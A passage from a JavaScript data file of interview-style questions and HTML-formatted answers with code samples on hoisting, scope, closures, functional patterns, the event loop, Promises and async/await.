const SEC_JS = {
  id:"javascript",title:"JavaScript",icon:"JS",
  ib:"rgba(247,223,30,.12)",ic:"#f7df1e",
  grp:"frontend",bar:"#f7df1e",tglow:"rgba(247,223,30,.07)",
  desc:"Core JavaScript — closures, async, prototypes, ES6+, browser APIs, security, and modern features.",
  tags:["Closures","Promises","Event Loop","ES6","Prototypes","Async/Await"],
  qs:[
    // ── BATCH 1-A: Language Basics ──────────────────────────────────────────
    {q:"What is Hoisting in JavaScript?",d:"easy",
     a:"<strong>Hoisting</strong> is JavaScript's behavior of moving declarations to the top of their scope before code executes.<br><br><strong>var</strong> is hoisted and initialised to <code>undefined</code>:<br><pre>console.log(x); // undefined (not ReferenceError)\nvar x = 5;</pre><br><strong>function declarations</strong> are fully hoisted (name + body):<br><pre>greet(); // works fine\nfunction greet() { console.log('Hello'); }</pre><br><strong>let / const</strong> are hoisted but NOT initialised — accessing them before declaration throws a <code>ReferenceError</code> (Temporal Dead Zone):<br><pre>console.log(y); // ReferenceError\nlet y = 10;</pre><br><strong>Key rule:</strong> only declarations are hoisted, not initialisations."},

    {q:"What is the Temporal Dead Zone (TDZ)?",d:"medium",
     a:"The <strong>Temporal Dead Zone</strong> is the period between entering a scope and the point where a <code>let</code> or <code>const</code> variable is declared. Accessing the variable during this period throws a <code>ReferenceError</code>.<br><pre>{\n  // TDZ starts here for 'x'\n  console.log(x); // ReferenceError: Cannot access 'x' before initialization\n  let x = 5;      // TDZ ends here\n  console.log(x); // 5\n}</pre><br><strong>Why it exists:</strong> prevents bugs from using uninitialised variables. <code>var</code> has no TDZ — it returns <code>undefined</code> instead, which can hide bugs."},

    {q:"What is the difference between let, var, and const?",d:"easy",
     a:"<table style='width:100%;border-collapse:collapse'><tr><th style='text-align:left;padding:4px 8px'>Feature</th><th style='padding:4px 8px'>var</th><th style='padding:4px 8px'>let</th><th style='padding:4px 8px'>const</th></tr><tr><td style='padding:4px 8px'>Scope</td><td style='padding:4px 8px'>function</td><td style='padding:4px 8px'>block</td><td style='padding:4px 8px'>block</td></tr><tr><td style='padding:4px 8px'>Hoisting</td><td style='padding:4px 8px'>yes (undefined)</td><td style='padding:4px 8px'>yes (TDZ)</td><td style='padding:4px 8px'>yes (TDZ)</td></tr><tr><td style='padding:4px 8px'>Re-declare</td><td style='padding:4px 8px'>yes</td><td style='padding:4px 8px'>no</td><td style='padding:4px 8px'>no</td></tr><tr><td style='padding:4px 8px'>Re-assign</td><td style='padding:4px 8px'>yes</td><td style='padding:4px 8px'>yes</td><td style='padding:4px 8px'>no</td></tr></table><br><pre>var a = 1; var a = 2;   // OK\nlet b = 1; let b = 2;   // SyntaxError\nconst c = 1; c = 2;     // TypeError\n\nif (true) {\n  var x = 10; // accessible outside block\n  let y = 20; // block-scoped\n}\nconsole.log(x); // 10\nconsole.log(y); // ReferenceError</pre><br><strong>Rule of thumb:</strong> prefer <code>const</code> by default, <code>let</code> when you need to reassign, avoid <code>var</code>."},

    {q:"What is the difference between == and === operators?",d:"easy",
     a:"<strong>== (loose equality)</strong> performs type coercion before comparing.<br><strong>=== (strict equality)</strong> compares value AND type — no coercion.<br><pre>0 == '0'      // true  (string coerced to number)\n0 === '0'     // false (different types)\nnull == undefined  // true\nnull === undefined // false\n'' == false   // true\n'' === false  // false\n1 == true     // true  (boolean coerced to 1)\n1 === true    // false</pre><br><strong>Always use ===</strong> unless you explicitly want type coercion (e.g., checking for null/undefined together with <code>== null</code>)."},

    {q:"What is the difference between null and undefined?",d:"easy",
     a:"<strong>undefined</strong> — a variable has been declared but not yet assigned a value. JavaScript sets it automatically.<br><strong>null</strong> — an intentional absence of value, set explicitly by the developer.<br><pre>let x;                  // undefined (auto)\nlet y = null;           // null (intentional)\n\ntypeof undefined        // 'undefined'\ntypeof null             // 'object' (historical bug in JS)\n\nnull == undefined       // true  (loose)\nnull === undefined      // false (strict)\n\nfunction foo() {}       // returns undefined (no return)\nlet arr = [1,,3];       // arr[1] is undefined (hole)</pre><br><strong>Practical rule:</strong> use <code>null</code> to explicitly signal 'no value'; <code>undefined</code> should be left to JS internals."},

    {q:"What is the typeof operator?",d:"easy",
     a:"<code>typeof</code> returns a string indicating the type of a value.<br><pre>typeof 42           // 'number'\ntypeof 'hello'      // 'string'\ntypeof true         // 'boolean'\ntypeof undefined    // 'undefined'\ntypeof Symbol()     // 'symbol'\ntypeof 42n          // 'bigint'\ntypeof function(){} // 'function'\ntypeof {}           // 'object'\ntypeof []           // 'object'  ← arrays are objects!\ntypeof null         // 'object'  ← historical bug\n</pre><br><strong>To check for array:</strong> use <code>Array.isArray(value)</code><br><strong>To check for null:</strong> use <code>value === null</code>"},

    {q:"What is scope in JavaScript?",d:"easy",
     a:"<strong>Scope</strong> defines where variables are accessible. JavaScript has three scope types:<br><br><strong>Global scope:</strong> accessible everywhere.<br><strong>Function scope:</strong> variables declared with <code>var</code> inside a function.<br><strong>Block scope:</strong> variables declared with <code>let</code>/<code>const</code> inside <code>{}</code>.<br><pre>var globalVar = 'global';\n\nfunction outer() {\n  var outerVar = 'outer';\n  function inner() {\n    var innerVar = 'inner';\n    console.log(outerVar);  // OK — closure\n    console.log(globalVar); // OK\n  }\n  // console.log(innerVar); // ReferenceError\n}\n\nif (true) {\n  let blockVar = 'block';\n}\n// console.log(blockVar); // ReferenceError</pre>"},

    {q:"What is Lexical Scope?",d:"medium",
     a:"<strong>Lexical scope</strong> means a function's scope is determined by where it is <em>defined</em> in the source code, not where it is <em>called</em>.<br><pre>const x = 'global';\n\nfunction outer() {\n  const x = 'outer';\n  function inner() {\n    console.log(x); // 'outer' — lexical scope, not call-site\n  }\n  return inner;\n}\n\nconst fn = outer();\nfn(); // 'outer' — even though called from global scope</pre><br><strong>Lexical scope enables closures</strong> — inner functions remember their outer scope. JavaScript uses <strong>static (lexical) scoping</strong>, unlike dynamic scoping (where the call-site determines scope)."},

    {q:"Does const make a value immutable?",d:"medium",
     a:"<strong>No.</strong> <code>const</code> prevents <em>reassignment</em> of the variable binding, but the value itself can still be mutated if it is an object or array.<br><pre>const obj = { name: 'Alice' };\nobj.name = 'Bob';       // OK — mutation of the object\nobj = { name: 'Charlie' }; // TypeError — reassignment\n\nconst arr = [1, 2, 3];\narr.push(4);  // OK — arr is [1,2,3,4]\narr = [];     // TypeError</pre><br><strong>To make an object truly immutable</strong> use <code>Object.freeze(obj)</code> (shallow) or deep-freeze recursively."},

    {q:"What is strict mode in JavaScript?",d:"medium",
     a:"<strong>Strict mode</strong> opts into a restricted variant of JavaScript that catches common mistakes and prevents unsafe features.<br><pre>'use strict'; // file-level\nfunction foo() { 'use strict'; } // function-level</pre><br><strong>What it does:</strong><ul><li>Throws on undeclared variables: <code>x = 5</code> → <code>ReferenceError</code></li><li>Prevents deleting variables: <code>delete x</code> → <code>SyntaxError</code></li><li>Prevents duplicate parameter names</li><li><code>this</code> is <code>undefined</code> in regular functions (not <code>window</code>)</li><li>Prevents <code>with</code> statement</li><li>Makes <code>eval</code> safer</li></ul><strong>ES6 modules are always in strict mode</strong> — no need to declare it."},

    {q:"What are primitive data types in JavaScript?",d:"easy",
     a:"JavaScript has <strong>7 primitive types</strong> — they are immutable and compared by value:<br><pre>// 1. Number\nlet n = 42, f = 3.14, inf = Infinity, nan = NaN;\n\n// 2. String\nlet s = 'hello';\n\n// 3. Boolean\nlet b = true;\n\n// 4. undefined\nlet u; // undefined\n\n// 5. null\nlet empty = null;\n\n// 6. Symbol (unique identifier)\nlet sym = Symbol('id');\n\n// 7. BigInt (large integers)\nlet big = 9007199254740991n;</pre><br>Everything else (objects, arrays, functions, dates) is a <strong>reference type (object)</strong> — compared by reference.<br><br><strong>Primitives are immutable:</strong><br><pre>let str = 'hello';\nstr[0] = 'H'; // silently fails\nconsole.log(str); // 'hello'</pre>"},

    {q:"What is pass by value vs pass by reference in JavaScript?",d:"medium",
     a:"<strong>Primitives</strong> are passed by <strong>value</strong> — a copy is made:<br><pre>let a = 5;\nfunction change(x) { x = 10; }\nchange(a);\nconsole.log(a); // 5 — unchanged</pre><br><strong>Objects/Arrays</strong> are passed by <strong>reference</strong> — the function receives a reference to the same object:<br><pre>let obj = { name: 'Alice' };\nfunction change(o) { o.name = 'Bob'; }\nchange(obj);\nconsole.log(obj.name); // 'Bob' — mutated\n\n// BUT reassigning the parameter doesn't affect the original\nfunction replace(o) { o = { name: 'Charlie' }; }\nreplace(obj);\nconsole.log(obj.name); // 'Bob' — not replaced</pre><br><strong>Technically</strong>: JS always passes by value. For objects, the value is the reference (memory address)."},

    // ── BATCH 1-B: Functions & Functional Programming ──────────────────────
    {q:"What are closures in JavaScript?",d:"medium",
     a:"A <strong>closure</strong> is a function that remembers its outer lexical scope even after the outer function has returned.<br><pre>function makeCounter() {\n  let count = 0;          // outer variable\n  return function() {     // inner function = closure\n    return ++count;       // remembers 'count'\n  };\n}\nconst counter = makeCounter();\nconsole.log(counter()); // 1\nconsole.log(counter()); // 2\nconsole.log(counter()); // 3</pre><br><strong>Classic closure pitfall with var in loops:</strong><br><pre>// Bug — all log 3\nfor (var i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 100);\n}\n// Fix — use let (block scope per iteration)\nfor (let i = 0; i < 3; i++) {\n  setTimeout(() => console.log(i), 100); // 0,1,2\n}</pre><br><strong>Use cases:</strong> data privacy, factory functions, memoisation, partial application, event handlers."},

    {q:"What are the uses of closures?",d:"medium",
     a:"<strong>1. Data privacy / encapsulation:</strong><br><pre>function createBankAccount(initial) {\n  let balance = initial; // private\n  return {\n    deposit: amt => balance += amt,\n    withdraw: amt => balance -= amt,\n    getBalance: () => balance\n  };\n}\nconst acc = createBankAccount(100);\nacc.deposit(50);\nconsole.log(acc.getBalance()); // 150\nconsole.log(acc.balance);      // undefined</pre><br><strong>2. Partial application / function factories:</strong><br><pre>const multiply = x => y => x * y;\nconst double = multiply(2);\nconsole.log(double(5)); // 10</pre><br><strong>3. Memoisation:</strong><br><pre>function memoize(fn) {\n  const cache = {};\n  return function(n) {\n    if (cache[n] !== undefined) return cache[n];\n    return (cache[n] = fn(n));\n  };\n}</pre><br><strong>4. Event handlers with context:</strong><br><pre>function makeHandler(msg) {\n  return () => console.log(msg);\n}\nbtn.addEventListener('click', makeHandler('clicked!'));</pre>"},

    {q:"What is a first class function?",d:"easy",
     a:"Functions are <strong>first class citizens</strong> in JavaScript — they can be:<ul><li>Assigned to variables</li><li>Passed as arguments to other functions</li><li>Returned from other functions</li><li>Stored in data structures</li></ul><pre>// Assign to variable\nconst greet = function(name) { return 'Hello ' + name; };\n\n// Pass as argument\n[1,2,3].map(x => x * 2); // function passed to map\n\n// Return from function\nfunction multiplier(x) {\n  return function(y) { return x * y; }; // returned function\n}\n\n// Store in object\nconst actions = {\n  add: (a, b) => a + b,\n  sub: (a, b) => a - b\n};</pre>"},

    {q:"What is a higher order function?",d:"easy",
     a:"A <strong>higher order function</strong> is a function that either takes one or more functions as arguments, or returns a function as its result (or both).<br><pre>// Takes a function as argument\n[1,2,3].map(x => x * 2);        // map is HOF\n[1,2,3].filter(x => x > 1);     // filter is HOF\n[1,2,3].reduce((a,b) => a + b); // reduce is HOF\n\n// Returns a function\nfunction createMultiplier(n) {\n  return x => x * n; // returns a function\n}\nconst triple = createMultiplier(3);\nconsole.log(triple(4)); // 12\n\n// Custom HOF — withLogging\nfunction withLogging(fn) {\n  return function(...args) {\n    console.log('Calling with', args);\n    const result = fn(...args);\n    console.log('Result:', result);\n    return result;\n  };\n}</pre>"},

    {q:"What is the currying function?",d:"medium",
     a:"<strong>Currying</strong> transforms a function with multiple arguments into a sequence of functions each taking one argument.<br><pre>// Normal function\nconst add = (a, b, c) => a + b + c;\nadd(1, 2, 3); // 6\n\n// Curried version\nconst curriedAdd = a => b => c => a + b + c;\ncurriedAdd(1)(2)(3); // 6\n\n// Partial application via currying\nconst add5 = curriedAdd(5);\nconst add5And3 = add5(3);\nconsole.log(add5And3(2)); // 10</pre><br><strong>Generic curry utility:</strong><br><pre>function curry(fn) {\n  return function curried(...args) {\n    if (args.length >= fn.length) {\n      return fn.apply(this, args);\n    }\n    return function(...args2) {\n      return curried.apply(this, args.concat(args2));\n    };\n  };\n}\nconst curriedAdd2 = curry((a,b,c) => a+b+c);\ncurriedAdd2(1)(2)(3); // 6\ncurriedAdd2(1,2)(3);  // 6</pre><br><strong>Use cases:</strong> function composition, creating specialised functions, functional pipelines."},

    {q:"What is a pure function?",d:"easy",
     a:"A <strong>pure function</strong> has two properties:<ol><li><strong>Same output for same input</strong> — deterministic</li><li><strong>No side effects</strong> — doesn't mutate external state, make API calls, read DOM, etc.</li></ol><pre>// Pure\nconst add = (a, b) => a + b;\nconst double = arr => arr.map(x => x * 2); // returns new array\n\n// Impure — modifies external state\nlet total = 0;\nconst addToTotal = n => { total += n; }; // side effect\n\n// Impure — same input, different output\nconst random = () => Math.random();\nconst now = () => Date.now();\n</pre><br><strong>Benefits:</strong> predictable, easy to test, cacheable (memoisation), safe for parallel execution."},

    {q:"What is memoization?",d:"medium",
     a:"<strong>Memoization</strong> is an optimisation technique that caches the results of expensive function calls so repeated calls with the same arguments return the cached result.<br><pre>function memoize(fn) {\n  const cache = new Map();\n  return function(...args) {\n    const key = JSON.stringify(args);\n    if (cache.has(key)) return cache.get(key);\n    const result = fn.apply(this, args);\n    cache.set(key, result);\n    return result;\n  };\n}\n\n// Expensive calculation\nconst fibonacci = memoize(function fib(n) {\n  if (n <= 1) return n;\n  return fibonacci(n - 1) + fibonacci(n - 2);\n});\n\nconsole.log(fibonacci(40)); // fast — cached\nconsole.log(fibonacci(40)); // instant</pre><br><strong>Best for:</strong> pure functions with expensive computation and repeated calls (fibonacci, factorial, complex queries)."},

    {q:"What is an IIFE (Immediately Invoked Function Expression)?",d:"medium",
     a:"An <strong>IIFE</strong> is a function that is defined and immediately called.<br><pre>// Syntax\n(function() {\n  console.log('I run immediately');\n})();\n\n// Arrow IIFE\n(() => console.log('Arrow IIFE'))();\n\n// With arguments\n(function(name) {\n  console.log('Hello ' + name);\n})('Alice');</pre><br><strong>Use cases:</strong><br><ul><li><strong>Avoid polluting global scope</strong> — variables inside IIFE are not accessible outside</li><li><strong>Module pattern</strong> — create private state</li><li><strong>Avoid TDZ issues</strong> with async initialisation</li></ul><pre>const counter = (function() {\n  let count = 0; // private\n  return {\n    increment: () => ++count,\n    get: () => count\n  };\n})();\ncounter.increment();\nconsole.log(counter.get()); // 1\nconsole.log(count);         // ReferenceError</pre>"},

    {q:"What is the difference between call, apply, and bind?",d:"medium",
     a:"All three set <code>this</code> for a function, but differ in how they pass arguments and when they invoke the function.<br><pre>function greet(greeting, punctuation) {\n  return `${greeting}, ${this.name}${punctuation}`;\n}\nconst user = { name: 'Alice' };\n\n// call — invoke immediately, args as comma-separated\ngreet.call(user, 'Hello', '!');      // 'Hello, Alice!'\n\n// apply — invoke immediately, args as array\ngreet.apply(user, ['Hi', '?']);      // 'Hi, Alice?'\n\n// bind — returns a NEW function, call later\nconst boundGreet = greet.bind(user, 'Hey');\nboundGreet('.');  // 'Hey, Alice.'</pre><br><strong>Memory aid:</strong><ul><li><code>call</code> — <strong>C</strong>omma-separated args</li><li><code>apply</code> — <strong>A</strong>rray of args</li><li><code>bind</code> — returns a <strong>B</strong>ound function</li></ul>"},

    {q:"What is the purpose of the `this` keyword in JavaScript?",d:"medium",
     a:"<code>this</code> refers to the <strong>execution context</strong> — the object that the current function is a method of. Its value depends on <em>how</em> the function is called.<br><pre>// 1. Global context (non-strict)\nconsole.log(this); // window (browser)\n\n// 2. Object method\nconst obj = {\n  name: 'Alice',\n  greet() { return this.name; } // this = obj\n};\nobj.greet(); // 'Alice'\n\n// 3. Regular function (strict mode)\nfunction foo() { 'use strict'; return this; }\nfoo(); // undefined\n\n// 4. Arrow function — no own 'this', inherits from lexical scope\nconst obj2 = {\n  name: 'Bob',\n  greet: () => this.name // this = outer scope (not obj2!)\n};\n\n// 5. Constructor\nfunction Person(name) { this.name = name; }\nconst p = new Person('Carol'); // this = new object\n\n// 6. Explicit binding\nconst fn = obj.greet.bind({ name: 'Dave' });\nfn(); // 'Dave'</pre>"},

    {q:"What are compose and pipe functions?",d:"hard",
     a:"<strong>Compose</strong> chains functions right-to-left. <strong>Pipe</strong> chains left-to-right (more readable).<br><pre>const compose = (...fns) => x => fns.reduceRight((v, f) => f(v), x);\nconst pipe    = (...fns) => x => fns.reduce((v, f) => f(v), x);\n\nconst double = x => x * 2;\nconst addOne = x => x + 1;\nconst square = x => x * x;\n\n// compose: square → addOne → double (right to left)\nconst transform = compose(double, addOne, square);\ntransform(3); // double(addOne(square(3))) = double(addOne(9)) = double(10) = 20\n\n// pipe: double → addOne → square (left to right)\nconst pipeline = pipe(double, addOne, square);\npipeline(3); // square(addOne(double(3))) = square(addOne(6)) = square(7) = 49</pre><br><strong>Use cases:</strong> data transformation pipelines, middleware chains, functional architecture."},

    {q:"What is referential transparency?",d:"medium",
     a:"A function/expression is <strong>referentially transparent</strong> if it can be replaced with its output value without changing the program's behaviour.<br><pre>// Referentially transparent\nconst add = (a, b) => a + b;\nadd(2, 3) === 5 // always — can replace add(2,3) with 5 anywhere\n\n// NOT referentially transparent\nlet x = 0;\nconst inc = () => ++x; // side effect\ninc() // 1 first time, 2 second time — cannot replace with a constant</pre><br><strong>Why it matters:</strong><ul><li>Enables memoization (safe to cache results)</li><li>Makes code easier to reason about and test</li><li>Enables compiler/engine optimizations</li></ul>All pure functions are referentially transparent."},

    {q:"What are examples of built-in higher order functions?",d:"easy",
     a:"<pre>const nums = [1, 2, 3, 4, 5];\n\n// map — transform each element\nnums.map(x => x * 2);           // [2,4,6,8,10]\n\n// filter — keep elements matching predicate\nnums.filter(x => x % 2 === 0);  // [2,4]\n\n// reduce — accumulate to single value\nnums.reduce((acc, x) => acc + x, 0); // 15\n\n// forEach — side-effect iteration\nnums.forEach(x => console.log(x));\n\n// find / findIndex\nnums.find(x => x > 3);        // 4\nnums.findIndex(x => x > 3);   // 3\n\n// some / every\nnums.some(x => x > 4);        // true\nnums.every(x => x > 0);       // true\n\n// sort — takes comparator\nnums.sort((a, b) => b - a);   // [5,4,3,2,1] descending\n\n// flatMap\n[[1,2],[3,4]].flatMap(x => x); // [1,2,3,4]</pre>"},

    {q:"How do you create polyfills for map, filter and reduce?",d:"hard",
     a:"<pre>// map polyfill\nArray.prototype.myMap = function(callback) {\n  const result = [];\n  for (let i = 0; i < this.length; i++) {\n    if (i in this) result.push(callback(this[i], i, this));\n  }\n  return result;\n};\n\n// filter polyfill\nArray.prototype.myFilter = function(callback) {\n  const result = [];\n  for (let i = 0; i < this.length; i++) {\n    if (i in this && callback(this[i], i, this)) {\n      result.push(this[i]);\n    }\n  }\n  return result;\n};\n\n// reduce polyfill\nArray.prototype.myReduce = function(callback, initialValue) {\n  let acc = initialValue !== undefined ? initialValue : this[0];\n  let startIndex = initialValue !== undefined ? 0 : 1;\n  for (let i = startIndex; i < this.length; i++) {\n    if (i in this) acc = callback(acc, this[i], i, this);\n  }\n  return acc;\n};\n\n[1,2,3].myMap(x => x*2);           // [2,4,6]\n[1,2,3].myFilter(x => x > 1);      // [2,3]\n[1,2,3].myReduce((a,b) => a+b, 0); // 6</pre>"},

    // ── BATCH 1-C: Async JavaScript & Event Loop ───────────────────────────
    {q:"What is the event loop in JavaScript?",d:"medium",
     a:"The <strong>event loop</strong> is the mechanism that allows JavaScript (single-threaded) to handle asynchronous operations.<br><br><strong>How it works:</strong><ol><li>JS runs code synchronously on the <strong>Call Stack</strong></li><li>Async operations (setTimeout, fetch) are handed to Web APIs</li><li>When complete, callbacks are queued in the <strong>Callback Queue (Macro-task queue)</strong></li><li>Promises resolve to the <strong>Microtask Queue</strong></li><li>The event loop checks: if Call Stack is empty → first drain ALL microtasks → then pick ONE macrotask → repeat</li></ol><pre>console.log('1');              // sync\nsetTimeout(() => console.log('2'), 0); // macrotask\nPromise.resolve().then(() => console.log('3')); // microtask\nconsole.log('4');              // sync\n\n// Output: 1, 4, 3, 2\n// Microtasks (Promise) run BEFORE macrotasks (setTimeout)</pre>"},

    {q:"What is the call stack?",d:"easy",
     a:"The <strong>call stack</strong> is a LIFO (Last In, First Out) data structure that tracks function invocations.<br><pre>function third() { console.log('third'); }\nfunction second() { third(); }\nfunction first() { second(); }\nfirst();\n\n// Stack grows:\n// [first]\n// [first, second]\n// [first, second, third]\n// third() runs, pops → [first, second]\n// second() returns → [first]\n// first() returns → []</pre><br><strong>Stack overflow:</strong> occurs when the stack exceeds its limit (typically 10,000–15,000 frames):<br><pre>function infinite() { infinite(); } // RangeError: Maximum call stack size exceeded</pre><br><strong>The call stack is single-threaded</strong> — only one function executes at a time."},

    {q:"What is a microtask in JavaScript?",d:"medium",
     a:"<strong>Microtasks</strong> are high-priority async tasks that run immediately after the current task (synchronous code), before any macrotasks (setTimeout, setInterval).<br><br><strong>Sources of microtasks:</strong><ul><li><code>Promise.then/catch/finally</code></li><li><code>queueMicrotask()</code></li><li><code>MutationObserver</code></li><li><code>await</code> (internally uses Promise)</li></ul><pre>console.log('start');\n\nsetTimeout(() => console.log('timeout'), 0);  // macrotask\nqueueMicrotask(() => console.log('microtask'));\nPromise.resolve().then(() => console.log('promise'));\n\nconsole.log('end');\n\n// Output: start → end → microtask → promise → timeout\n// ALL microtasks drain before ANY macrotask runs</pre>"},

    {q:"What are tasks (macrotasks) in the event loop?",d:"medium",
     a:"<strong>Macrotasks</strong> (or tasks) are async operations that are placed in the task queue and processed one at a time by the event loop — each after a full microtask queue drain.<br><br><strong>Sources of macrotasks:</strong><ul><li><code>setTimeout</code>, <code>setInterval</code></li><li><code>setImmediate</code> (Node.js)</li><li>I/O callbacks (Node.js)</li><li>UI rendering events (browser)</li><li><code>MessageChannel</code></li></ul><pre>// Execution order:\n// 1. Synchronous code (current task)\n// 2. All microtasks (Promise callbacks)\n// 3. Render (browser)\n// 4. One macrotask\n// 5. All microtasks again\n// 6. Next macrotask...\n\nsetTimeout(() => console.log('A'), 0);\nsetTimeout(() => console.log('B'), 0);\nPromise.resolve().then(() => console.log('C'));\n// Output: C → A → B</pre>"},

    {q:"What is a callback function?",d:"easy",
     a:"A <strong>callback</strong> is a function passed as an argument to another function, to be called at a later time.<br><pre>// Synchronous callback\n[1,2,3].forEach(function(item) {\n  console.log(item); // called for each element\n});\n\n// Asynchronous callback\nsetTimeout(function() {\n  console.log('runs after 1 second');\n}, 1000);\n\n// Node.js error-first callback pattern\nfs.readFile('file.txt', function(err, data) {\n  if (err) { console.error(err); return; }\n  console.log(data);\n});</pre><br><strong>Problems with callbacks:</strong> callback hell (deep nesting), error handling complexity, hard to reason about execution order → solved by Promises and async/await."},

    {q:"What is callback hell?",d:"easy",
     a:"<strong>Callback hell</strong> (pyramid of doom) occurs when callbacks are nested deeply, making code hard to read and maintain.<br><pre>// Callback hell — hard to read, hard to error-handle\ngetUser(id, function(user) {\n  getOrders(user.id, function(orders) {\n    getItems(orders[0].id, function(items) {\n      getPrice(items[0].id, function(price) {\n        // deeply nested, fragile\n      }, handleError);\n    }, handleError);\n  }, handleError);\n}, handleError);\n\n// Solution 1: Promises (flat chaining)\ngetUser(id)\n  .then(user => getOrders(user.id))\n  .then(orders => getItems(orders[0].id))\n  .then(items => getPrice(items[0].id))\n  .then(price => console.log(price))\n  .catch(handleError);\n\n// Solution 2: async/await (looks synchronous)\nasync function process() {\n  try {\n    const user   = await getUser(id);\n    const orders = await getOrders(user.id);\n    const items  = await getItems(orders[0].id);\n    const price  = await getPrice(items[0].id);\n  } catch(err) { handleError(err); }\n}</pre>"},

    {q:"What is a Promise?",d:"easy",
     a:"A <strong>Promise</strong> is an object representing the eventual completion (or failure) of an asynchronous operation.<br><pre>const promise = new Promise((resolve, reject) => {\n  setTimeout(() => resolve('success'), 1000);\n});\n\npromise\n  .then(value => console.log(value))    // 'success' after 1s\n  .catch(err => console.error(err))\n  .finally(() => console.log('done')); // always runs</pre><br><strong>Creating utility Promises:</strong><br><pre>// Already resolved\nPromise.resolve(42).then(v => console.log(v));\n\n// Already rejected\nPromise.reject(new Error('fail')).catch(e => console.error(e));</pre>"},

    {q:"Explain the three states of a Promise",d:"easy",
     a:"A Promise is always in one of three states:<br><br><strong>1. Pending</strong> — initial state, operation not yet complete<br><strong>2. Fulfilled</strong> — operation completed successfully, <code>resolve(value)</code> was called<br><strong>3. Rejected</strong> — operation failed, <code>reject(error)</code> was called<br><br>A promise that is either fulfilled or rejected is called <strong>settled</strong>. Once settled, a promise cannot change state.<br><pre>const p = new Promise((resolve, reject) => {\n  // State: pending\n  setTimeout(() => {\n    resolve('done');\n    // State: fulfilled — cannot reject after this\n  }, 1000);\n});\n\n// p.then() runs when fulfilled\n// p.catch() runs when rejected\n// p.finally() runs when settled (either way)</pre>"},

    {q:"What is promise chaining?",d:"medium",
     a:"<strong>Promise chaining</strong> links multiple async operations sequentially — each <code>.then()</code> returns a new Promise, allowing the next <code>.then()</code> to receive its resolved value.<br><pre>fetch('/api/user/1')\n  .then(res => res.json())             // parse JSON\n  .then(user => fetch(`/api/orders/${user.id}`)) // fetch orders\n  .then(res => res.json())\n  .then(orders => console.log(orders))\n  .catch(err => console.error(err));   // catches any error in chain\n\n// Key rules:\n// 1. Return a value from .then() → next .then() receives it\n// 2. Return a Promise from .then() → chain waits for it\n// 3. Throw in .then() → jumps to next .catch()\n// 4. .catch() also returns a Promise — chain can continue after it</pre>"},

    {q:"What is Promise.all?",d:"medium",
     a:"<strong>Promise.all()</strong> takes an array of promises and returns a single Promise that:<ul><li><strong>Resolves</strong> when ALL promises resolve → array of results in order</li><li><strong>Rejects</strong> as soon as ANY one promise rejects (fail-fast)</li></ul><pre>const p1 = fetch('/api/users').then(r => r.json());\nconst p2 = fetch('/api/orders').then(r => r.json());\nconst p3 = fetch('/api/products').then(r => r.json());\n\n// All run in PARALLEL — fast\nconst [users, orders, products] = await Promise.all([p1, p2, p3]);\n\n// If ANY rejects, entire Promise.all rejects\ntry {\n  await Promise.all([p1, p2, Promise.reject('oops')]);\n} catch(e) { console.error(e); } // 'oops'</pre><br><strong>vs Promise.allSettled():</strong> waits for ALL to settle regardless of success/failure — returns <code>[{status,value},{status,reason}]</code>."},

    {q:"What is the purpose of Promise.race?",d:"medium",
     a:"<strong>Promise.race()</strong> returns a Promise that settles (resolves OR rejects) as soon as the first promise in the array settles.<br><pre>// Timeout pattern — race between fetch and timeout\nconst timeout = new Promise((_, reject) =>\n  setTimeout(() => reject(new Error('Timeout!')), 3000)\n);\n\ntry {\n  const data = await Promise.race([fetch('/api/slow'), timeout]);\n} catch(e) {\n  console.error('Either timed out or fetch failed');\n}\n\n// Fastest server wins\nconst result = await Promise.race([\n  fetch('https://server1.com/data'),\n  fetch('https://server2.com/data')\n]);</pre><br><strong>Related methods:</strong><ul><li><code>Promise.any()</code> — resolves on first <em>success</em>, rejects only if ALL reject</li><li><code>Promise.allSettled()</code> — waits for all, never rejects</li></ul>"},

    {q:"What is an async function (async/await)?",d:"medium",
     a:"<strong>async/await</strong> is syntactic sugar over Promises that makes async code look synchronous.<br><pre>// Promise-based\nfunction getUser(id) {\n  return fetch(`/api/users/${id}`)\n    .then(res => res.json())\n    .then(user => user.name);\n}\n\n// async/await equivalent\nasync function getUser(id) {\n  const res  = await fetch(`/api/users/${id}`); // suspends here\n  const user = await res.json();\n  return user.name; // async function always returns a Promise\n}\n\n// Error handling\nasync function main() {\n  try {\n    const name = await getUser(1);\n    console.log(name);\n  } catch(err) {\n    console.error(err);\n  }\n}\n\n// Parallel with async/await\nasync function parallel() {\n  const [a, b] = await Promise.all([\n    fetch('/api/a').then(r=>r.json()),\n    fetch('/api/b').then(r=>r.json())\n  ]);\n}</pre><br><strong>Key rule:</strong> every <code>async</code> function returns a Promise, even if you return a plain value."},

    {q:"How do you prevent promises from swallowing errors?",d:"hard",
     a:"<strong>Unhandled promise rejections</strong> are silently ignored by default, making bugs hard to find.<br><pre>// Bug: silent failure\nPromise.reject(new Error('oops')); // No .catch() → swallowed\n\n// Fix 1: always chain .catch()\nfetch('/api/data').then(process).catch(handleError);\n\n// Fix 2: async/await with try/catch\nasync function main() {\n  try { await riskyOperation(); }\n  catch(e) { console.error(e); }\n}\n\n// Fix 3: global handler (Node.js)\nprocess.on('unhandledRejection', (reason, promise) => {\n  console.error('Unhandled rejection:', reason);\n  process.exit(1);\n});\n\n// Fix 4: global handler (browser)\nwindow.addEventListener('unhandledrejection', event => {\n  console.error('Unhandled:', event.reason);\n});\n\n// Fix 5: Promise.allSettled — never rejects\nconst results = await Promise.allSettled([p1, p2, p3]);\nresults.forEach(r => {\n  if (r.status === 'rejected') console.error(r.reason);\n});</pre>"},

    {q:"What is the difference between setTimeout, setImmediate, and process.nextTick?",d:"hard",
     a:"This is a <strong>Node.js</strong> question about execution order:<br><pre>// Execution order:\n// 1. Synchronous code\n// 2. process.nextTick queue (highest priority microtask)\n// 3. Promise microtasks\n// 4. setImmediate (check phase of event loop)\n// 5. setTimeout(fn, 0) (timer phase)\n\nsetTimeout(() => console.log('setTimeout'), 0);\nsetImmediate(() => console.log('setImmediate'));\nprocess.nextTick(() => console.log('nextTick'));\nPromise.resolve().then(() => console.log('promise'));\nconsole.log('sync');\n\n// Output: sync → nextTick → promise → setImmediate → setTimeout\n// (setTimeout vs setImmediate order may vary outside I/O callbacks)</pre><br><table><tr><th>Method</th><th>When</th></tr><tr><td>process.nextTick</td><td>Before next event loop iteration</td></tr><tr><td>Promise.then</td><td>Microtask queue</td></tr><tr><td>setImmediate</td><td>After I/O in current iteration</td></tr><tr><td>setTimeout(0)</td><td>Timer phase (≥ 0ms)</td></tr></table>"},

